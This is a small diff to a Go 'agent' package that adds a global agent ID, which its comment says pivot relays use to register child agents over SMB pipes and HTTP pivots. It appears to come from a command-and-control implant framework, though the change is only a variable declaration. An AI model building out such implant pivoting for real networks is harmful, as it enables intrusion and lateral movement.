@@ -1,5 +1,9 @@
 package agent
 
+// GlobalAgentID is set after successful registration; used by pivot relays to
+// inject parent_id when registering child agents (SMB pipe, HTTP pivot).
+var GlobalAgentID string
+
 var (
 	ServerURL  = "http://127.0.0.1:8080"
 	Transport  = "http"
